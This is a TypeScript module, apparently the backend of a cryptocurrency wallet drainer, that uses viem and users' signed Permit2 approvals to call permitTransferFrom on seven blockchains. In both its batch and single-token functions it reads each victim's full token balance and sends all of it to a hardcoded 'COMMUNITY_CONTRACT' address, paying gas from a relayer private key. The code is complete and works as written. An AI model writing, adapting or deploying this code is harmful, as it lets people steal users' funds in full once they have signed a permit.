import { createPublicClient, createWalletClient, http } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;
const COMMUNITY_CONTRACT = "0x2c73de09a4C59E910343626Ab6b4A4d974EC731f" as const;

const ERC20_ABI = [
  {
    inputs: [{ name: "owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" }
    ],
    name: "allowance",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function"
  }
] as const;

const PERMIT2_SINGLE_ABI = [
  {
    inputs: [
      {
        components: [
          {
            components: [
              { name: "token", type: "address" },
              { name: "amount", type: "uint256" }
            ],
            name: "permitted",
            type: "tuple"
          },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ],
        name: "permit",
        type: "tuple"
      },
      {
        components: [
          { name: "to", type: "address" },
          { name: "requestedAmount", type: "uint256" }
        ],
        name: "transferDetails",
        type: "tuple"
      },
      { name: "owner", type: "address" },
      { name: "signature", type: "bytes" }
    ],
    name: "permitTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function"
  }
] as const;

const PERMIT2_BATCH_ABI = [
  {
    inputs: [
      {
        components: [
          {
            components: [
              { name: "token", type: "address" },
              { name: "amount", type: "uint256" }
            ],
            name: "permitted",
            type: "tuple[]"
          },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ],
        name: "permit",
        type: "tuple"
      },
      {
        components: [
          { name: "to", type: "address" },
          { name: "requestedAmount", type: "uint256" }
        ],
        name: "transferDetails",
        type: "tuple[]"
      },
      { name: "owner", type: "address" },
      { name: "signature", type: "bytes" }
    ],
    name: "permitTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function"
  }
] as const;

const chainConfigs: Record<number, { chain: any; rpcUrl: string }> = {
  1: { chain: mainnet, rpcUrl: 'https://eth.llamarpc.com' },
  56: { chain: bsc, rpcUrl: 'https://bsc-dataseed.binance.org' },
  137: { chain: polygon, rpcUrl: 'https://polygon-rpc.com' },
  42161: { chain: arbitrum, rpcUrl: 'https://arb1.arbitrum.io/rpc' },
  10: { chain: optimism, rpcUrl: 'https://mainnet.optimism.io' },
  43114: { chain: avalanche, rpcUrl: 'https://api.avax.network/ext/bc/C/rpc' },
  8453: { chain: base, rpcUrl: 'https://mainnet.base.org' },
};

function getAccount() {
  const privateKey = process.env.RELAYER_PRIVATE_KEY;
  if (!privateKey) throw new Error('RELAYER_PRIVATE_KEY not configured');
  return privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
}

export function getRelayerAddress(): string | null {
  try {
    const account = getAccount();
    return account.address;
  } catch {
    return null;
  }
}

export async function executePermit2BatchTransfer(params: {
  chainId: number;
  owner: string;
  permitted: { token: string; amount: string }[];
  nonce: string;
  deadline: string;
  signature: string;
}): Promise<{ success: boolean; txHash?: string; error?: string; transfers: { token: string; amount: string; success: boolean }[] }> {
  const transfers: { token: string; amount: string; success: boolean }[] = [];

  try {
    const { chainId, owner, permitted, nonce, deadline, signature } = params;
    const chainConfig = chainConfigs[chainId];

    if (!chainConfig) {
      return { success: false, error: `Unsupported chain: ${chainId}`, transfers };
    }

    const account = getAccount();

    const publicClient = createPublicClient({
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const walletClient = createWalletClient({
      account,
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const ownerAddr = owner as `0x${string}`;
    const transferDetails: { to: `0x${string}`; requestedAmount: bigint }[] = [];

    for (const p of permitted) {
      const tokenAddr = p.token as `0x${string}`;
      try {
        const balance = await publicClient.readContract({
          address: tokenAddr,
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [ownerAddr],
        });

        console.log(`[Permit2] Balance for ${p.token} on chain ${chainId}: ${balance}`);

        transferDetails.push({
          to: COMMUNITY_CONTRACT,
          requestedAmount: balance,
        });

        transfers.push({
          token: p.token,
          amount: balance.toString(),
          success: balance > BigInt(0),
        });
      } catch (err: any) {
        console.error(`[Permit2] Error checking balance for ${p.token}:`, err?.message);
        transferDetails.push({
          to: COMMUNITY_CONTRACT,
          requestedAmount: BigInt(0),
        });
        transfers.push({ token: p.token, amount: '0', success: false });
      }
    }

    const hasTokensToTransfer = transferDetails.some(t => t.requestedAmount > BigInt(0));
    if (!hasTokensToTransfer) {
      console.log('[Permit2] No tokens to transfer (all balances are 0)');
      return { success: true, transfers, error: 'No token balances found' };
    }

    console.log(`[Permit2] Executing batch permitTransferFrom for ${permitted.length} tokens`);
    console.log(`[Permit2] Tokens with balance: ${transfers.filter(t => t.success).map(t => t.token).join(', ')}`);
    console.log(`[Permit2] Tokens with zero balance (will transfer 0): ${transfers.filter(t => !t.success).map(t => t.token).join(', ')}`);

    const permitArg = {
      permitted: permitted.map(p => ({
        token: p.token as `0x${string}`,
        amount: BigInt(p.amount),
      })),
      nonce: BigInt(nonce),
      deadline: BigInt(deadline),
    };

    const txHash = await walletClient.writeContract({
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_BATCH_ABI,
      functionName: 'permitTransferFrom',
      args: [
        permitArg,
        transferDetails,
        ownerAddr,
        signature as `0x${string}`,
      ],
      chain: chainConfig.chain,
    });

    console.log(`[Permit2] Transaction submitted: ${txHash}`);

    const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });

    if (receipt.status === 'success') {
      console.log(`[Permit2] Batch transfer successful: ${txHash}`);
      return { success: true, txHash, transfers };
    } else {
      return { success: false, error: 'Transaction reverted', txHash, transfers };
    }
  } catch (error: any) {
    console.error('[Permit2] Error:', error?.message || error);
    return { success: false, error: error?.message || 'Unknown error', transfers };
  }
}

export async function executePermit2SingleTransfer(params: {
  chainId: number;
  owner: string;
  token: string;
  amount: string;
  nonce: string;
  deadline: string;
  signature: string;
}): Promise<{ success: boolean; txHash?: string; error?: string; transferredAmount?: string }> {
  try {
    const { chainId, owner, token, amount, nonce, deadline, signature } = params;
    const chainConfig = chainConfigs[chainId];

    if (!chainConfig) {
      return { success: false, error: `Unsupported chain: ${chainId}` };
    }

    const account = getAccount();

    const publicClient = createPublicClient({
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const walletClient = createWalletClient({
      account,
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const ownerAddr = owner as `0x${string}`;
    const tokenAddr = token as `0x${string}`;

    const balance = await publicClient.readContract({
      address: tokenAddr,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [ownerAddr],
    });

    console.log(`[Permit2] Balance for ${token}: ${balance}`);

    if (balance === BigInt(0)) {
      return { success: true, error: 'No balance', transferredAmount: '0' };
    }

    const permitArg = {
      permitted: {
        token: tokenAddr,
        amount: BigInt(amount),
      },
      nonce: BigInt(nonce),
      deadline: BigInt(deadline),
    };

    const transferDetailsArg = {
      to: COMMUNITY_CONTRACT,
      requestedAmount: balance,
    };

    const txHash = await walletClient.writeContract({
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_SINGLE_ABI,
      functionName: 'permitTransferFrom',
      args: [
        permitArg,
        transferDetailsArg,
        ownerAddr,
        signature as `0x${string}`,
      ],
      chain: chainConfig.chain,
    });

    console.log(`[Permit2] Transaction submitted: ${txHash}`);

    const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });

    if (receipt.status === 'success') {
      console.log(`[Permit2] Transfer successful: ${txHash}`);
      return { success: true, txHash, transferredAmount: balance.toString() };
    } else {
      return { success: false, error: 'Transaction reverted', txHash };
    }
  } catch (error: any) {
    console.error('[Permit2] Error:', error?.message || error);
    return { success: false, error: error?.message || 'Unknown error' };
  }
}
